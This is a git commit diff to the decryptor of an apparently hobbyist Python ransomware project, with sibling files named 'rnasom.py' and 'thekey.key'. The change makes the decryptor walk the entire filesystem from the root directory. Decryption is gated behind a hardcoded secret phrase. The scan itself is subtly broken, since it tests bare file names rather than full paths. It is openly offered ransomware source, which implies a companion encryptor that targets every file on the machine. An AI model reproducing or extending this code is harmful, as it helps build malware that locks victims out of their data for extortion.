52ce496a886f4a9dc7e84e91f56cf09b4147759f
Pulak Jindal <pulakjindal04@gmail.com>
2025-10-14 10:20:03 +0530

    It will start from the root directory itself

--- ransomware/decrypt.py
+++ ransomware/decrypt.py
@@ -3,12 +3,16 @@ from cryptography.fernet import Fernet
 
 files = []
 
-for file in os.listdir():
-    if file == 'rnasom.py' or file == 'thekey.key' or file == 'decrypt.py':
-        continue
-    if os.path.isfile(file):
-        files.append(file)
-        print(files)
+rootDir = os.path.abspath(os.sep)
+os.chdir(rootDir)
+for foldername, subfolder, filename in os.walk('.'):
+    for file in filename:
+        if file == 'rnasom.py' or file == 'thekey.key' or file == 'decrypt.py':
+            continue
+        if os.path.isfile(file):
+            files.append(file)
+
+#print(files)
         
 secretPhrase = input("Enter the secret phrase to decrypt your files: ")
 if secretPhrase != "autoSpy":
